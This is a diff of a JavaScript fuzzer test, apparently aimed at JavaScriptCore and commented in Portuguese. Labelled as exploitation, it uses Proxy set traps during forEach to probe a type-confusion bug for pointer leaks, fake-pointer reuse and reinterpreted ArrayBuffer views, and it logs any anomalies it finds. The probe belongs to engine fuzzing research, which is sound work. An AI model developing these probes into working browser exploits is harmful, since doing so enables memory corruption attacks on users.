@@ -1,4 +1,5 @@
-﻿\'use strict\';\n/**
+'use strict';
+/**
  * Teste 11 — Proxy forEach Type Confusion EXPLOITAÇÃO
  *
  * Bug confirmado no Teste 3A:
@@ -20,10 +21,10 @@
 (function (global) {
   global.FuzzerTests = global.FuzzerTests || {};
 
-  global.FuzzerTests[\'11\'] = {
+  global.FuzzerTests['11'] = {
     id      : 11,
-    name    : \'Proxy forEach — Type Confusion EXPLOITAÇÃO (MARKER*2)\',
-    category: \'JSC-Exploit\',
+    name    : 'Proxy forEach — Type Confusion EXPLOITAÇÃO (MARKER*2)',
+    category: 'JSC-Exploit',
     timeout : 5000,
 
     run: function () {
@@ -38,11 +39,11 @@
 
           var proxy = new Proxy(target, {
             set: function (t, prop, val, recv) {
-              if (prop === \'4\') {
+              if (prop === '4') {
                 /* Em vez de retornar o valor normal, retornar um objeto.
                  * Se o C++ usa o retorno do set trap como base para
                  * o cálculo forEach, pode interpretar o ponteiro como double. */
-                leaked = { fake: \'object\', idx: 42 };
+                leaked = { fake: 'object', idx: 42 };
                 return Reflect.set(t, prop, leaked, recv);
               }
               return Reflect.set(t, prop, val, recv);
@@ -56,14 +57,14 @@
           /* Se target[4] for um número estranho (ponteiro reinterpretado),
            * temos type confusion. */
           var final = target[4];
-          if (typeof final === \'number\' && final > 1e10) {
-            anomalies.push(\'A: POSSÍVEL LEAK DE PONTEIRO: target[4]=\' + final +
-              \' (hex-like: \' + final.toString(16) + \')\');
-          } else if (typeof final === \'object\') {
-            anomalies.push(\'A: objeto sobreviveu no array numérico: \' + JSON.stringify(final));
+          if (typeof final === 'number' && final > 1e10) {
+            anomalies.push('A: POSSÍVEL LEAK DE PONTEIRO: target[4]=' + final +
+              ' (hex-like: ' + final.toString(16) + ')');
+          } else if (typeof final === 'object') {
+            anomalies.push('A: objeto sobreviveu no array numérico: ' + JSON.stringify(final));
           }
         } catch (e) {
-          anomalies.push(\'A: \' + String(e));
+          anomalies.push('A: ' + String(e));
         }
       }());
 
@@ -75,7 +76,7 @@
 
           var proxy = new Proxy(target, {
             set: function (t, prop, val, recv) {
-              if (prop === \'4\') {
+              if (prop === '4') {
                 return Reflect.set(t, prop, fakePointer, recv);
               }
               return Reflect.set(t, prop, val, recv);
@@ -88,11 +89,11 @@
 
           var final = target[4];
           if (final === fakePointer * 2) {
-            anomalies.push(\'B: fakePointer duplicado: \' + final +
-              \' — C++ está usando valor retornado do trap\');
+            anomalies.push('B: fakePointer duplicado: ' + final +
+              ' — C++ está usando valor retornado do trap');
           }
         } catch (e) {
-          anomalies.push(\'B: \' + String(e));
+          anomalies.push('B: ' + String(e));
         }
       }());
 
@@ -107,7 +108,7 @@
           /* Tentar colocar o ArrayBuffer no array durante forEach */
           var proxy = new Proxy(target, {
             set: function (t, prop, val, recv) {
-              if (prop === \'4\') {
+              if (prop === '4') {
                 /* Substituir por uma view do ArrayBuffer */
                 return Reflect.set(t, prop, view, recv);
               }
@@ -120,11 +121,11 @@
           });
 
           var final = target[4];
-          if (typeof final === \'number\' && final !== view) {
-            anomalies.push(\'C: ArrayBuffer view reinterpretado como número: \' + final);
+          if (typeof final === 'number' && final !== view) {
+            anomalies.push('C: ArrayBuffer view reinterpretado como número: ' + final);
           }
         } catch (e) {
-          anomalies.push(\'C: \' + String(e));
+          anomalies.push('C: ' + String(e));
         }
       }());
 
@@ -134,7 +135,7 @@
           var target = [1, 2, 3, 4, 5];
           var proxy = new Proxy(target, {
             set: function (t, prop, val, recv) {
-              if (prop === \'2\') {
+              if (prop === '2') {
                 delete t[3]; /* Criar hole no meio */
               }
               return Reflect.set(t, prop, val, recv);
@@ -147,17 +148,17 @@
 
           /* Se o C++ não re-verifica holes, pode acessar índice inválido */
           if (target[3] !== undefined && target[3] !== 8) {
-            anomalies.push(\'D: target[3] inesperado após delete: \' + target[3]);
+            anomalies.push('D: target[3] inesperado após delete: ' + target[3]);
           }
         } catch (e) {
-          anomalies.push(\'D: \' + String(e));
+          anomalies.push('D: ' + String(e));
         }
       }());
 
       if (anomalies.length > 0) {
-        return { status: \'ANOMALY\', detail: anomalies.join(\' | \') };
+        return { status: 'ANOMALY', detail: anomalies.join(' | ') };
       }
-      return { status: \'PASS\', detail: \'A-D sem anomalias\' };
+      return { status: 'PASS', detail: 'A-D sem anomalias' };
     }
   };
 
